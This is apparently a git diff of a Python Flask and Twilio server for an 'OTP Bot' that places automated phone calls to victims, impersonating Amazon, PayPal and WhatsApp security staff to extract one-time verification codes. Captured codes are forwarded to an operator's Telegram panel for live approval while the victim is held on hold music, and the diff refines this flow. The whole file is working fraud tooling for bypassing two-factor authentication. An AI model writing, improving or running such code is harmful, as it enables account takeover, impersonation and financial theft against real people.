@@ -1,11 +1,14 @@
 from flask import Flask, request, jsonify, Response
 from threading import Thread
-from database import add_subscription_days, get_user_script
-from config import bot, LIVE_FEED_CHANNEL_ID
+from database import get_user_script
+from config import bot, LIVE_FEED_CHANNEL_ID, TWILIO_APP_URL
 from twilio.twiml.voice_response import VoiceResponse, Gather
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from logger import send_log
-import json
+import logging
+
+# Configuración básica de logs de Flask
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
 
 app = Flask('')
 
@@ -15,12 +18,13 @@ app = Flask('')
 DEFAULT_SCRIPTS = {
     "amazon": "Hello. This is Amazon Security. We detected a suspicious purchase. Please enter the verification code sent to your mobile device.",
     "paypal": "Hello. This is PayPal Fraud Prevention. A login attempt was made from a new device. Enter your security code to block it.",
+    "whatsapp": "Hello. This is WhatsApp Support. We noticed a login request. Please enter the 6-digit code to verify your account.",
     "default": "Hello. This is an automated security call from {service}. We detected unauthorized activity. Please enter the verification code sent to your mobile."
 }
 
 @app.route('/')
 def home():
-    return "Mussolini OTP Bot - Live Panel Ready."
+    return "OTP Bot Server Running."
 
 # ==========================================
 # 1. TWILIO VOICE (INICIO)
@@ -55,7 +59,7 @@ def twilio_voice():
     gather.say(say_text, voice='alice', language=lang)
     
     resp.append(gather)
-    resp.redirect('/twilio/voice') # Si no pone nada, repite el loop
+    resp.redirect('/twilio/voice') # Loop si no ingresa nada
     return Response(str(resp), mimetype='text/xml')
 
 # ==========================================
@@ -64,7 +68,7 @@ def twilio_voice():
 @app.route('/twilio/gather', methods=['POST'])
 def twilio_gather():
     digits = request.values.get('Digits')
-    call_sid = request.values.get('CallSid') # ID Único de la llamada
+    call_sid = request.values.get('CallSid')
     user_id = request.args.get('user_id')
     service = request.args.get('service')
     
@@ -74,7 +78,6 @@ def twilio_gather():
         # A) Enviar Panel a Telegram
         try:
             markup = InlineKeyboardMarkup()
-            # Botones con CallSid para saber qué llamada modificar
             markup.row(
                 InlineKeyboardButton("✅ APPROVE", callback_data=f"live_approve_{call_sid}"),
                 InlineKeyboardButton("❌ REJECT / RETRY", callback_data=f"live_reject_{call_sid}")
@@ -100,10 +103,9 @@ def twilio_gather():
 
         # B) Poner a la víctima en ESPERA (Música)
         resp.say("Please hold while we verify your identity.", voice='alice')
-        resp.play("http://com.twilio.sounds.music/ClockworkWaltz.mp3") # Música de espera
         
-        # C) Loop de espera (Se queda aquí hasta que toques un botón en Telegram)
-        resp.redirect('/twilio/wait_loop') 
+        # C) Iniciar Loop de espera (Loop empieza en 1)
+        resp.redirect('/twilio/wait_loop?loop=1') 
         
     else:
         resp.say("Invalid input.", voice='alice')
@@ -115,12 +117,29 @@ def twilio_gather():
 # 3. RUTAS DE LÓGICA (LIVE PANEL)
 # ==========================================
 
-@app.route('/twilio/wait_loop', methods=['POST'])
+@app.route('/twilio/wait_loop', methods=['POST', 'GET'])
 def wait_loop():
-    """Mantiene la música sonando en bucle."""
+    """
+    Mantiene la música sonando, PERO con un límite de seguridad.
+    Cada loop es ~30 segundos de música.
+    """
+    # 1. Obtenemos el contador de vueltas (si no existe, es 1)
+    loop_count = int(request.args.get('loop', 1))
+    
     resp = VoiceResponse()
+    
+    # 2. Seguridad: Si lleva más de 3 vueltas (aprox 1:30 min), CORTAR.
+    if loop_count > 3:
+        resp.say("Verification timed out. Goodbye.", voice='alice')
+        resp.hangup()
+        return Response(str(resp), mimetype='text/xml')
+
+    # 3. Si no ha llegado al límite, reproducir música y sumar 1 vuelta
     resp.play("http://com.twilio.sounds.music/ClockworkWaltz.mp3")
-    resp.redirect('/twilio/wait_loop')
+    
+    # Redirigimos pasándole el nuevo contador (+1)
+    resp.redirect(f'/twilio/wait_loop?loop={loop_count + 1}')
+    
     return Response(str(resp), mimetype='text/xml')
 
 @app.route('/twilio/logic/approve', methods=['POST'])
@@ -138,8 +157,6 @@ def logic_reject():
     resp.say("The verification code is invalid. Please try again.", voice='alice')
     
     # Volvemos a pedir el código (Gather)
-    # Importante: Necesitamos recuperar los params, pero Twilio no los guarda en redirect simple.
-    # Por simplicidad, mandamos al input genérico.
     gather = Gather(num_digits=8, action='/twilio/gather_retry', method='POST', timeout=10)
     gather.say("Please enter the verification code again.", voice='alice')
     resp.append(gather)
@@ -148,14 +165,12 @@ def logic_reject():
 
 @app.route('/twilio/gather_retry', methods=['POST'])
 def gather_retry():
-    """Maneja el segundo intento (o tercero, cuarto...)"""
-    # Aquí podríamos volver a enviar al panel de Telegram si quisieras bucle infinito
-    # Para este ejemplo, si falla la segunda, colgamos.
+    """Maneja el segundo intento."""
     digits = request.values.get('Digits')
     resp = VoiceResponse()
     if digits:
         resp.say("Thank you. We are verifying.", voice='alice')
-        resp.hangup() # O podrías volver a mandarlo a Telegram para aprobar de nuevo
+        resp.hangup() 
     else:
         resp.say("Goodbye.", voice='alice')
         resp.hangup()
@@ -166,8 +181,6 @@ def gather_retry():
 # ==========================================
 @app.route('/twilio/status', methods=['POST'])
 def twilio_status():
-    # Tu código de status actual (Answered, Completed, etc.)
-    # ... (Copia el que ya tenías o usa el simplificado)
     return Response("OK", mimetype='text/plain')
 
 # ==========================================
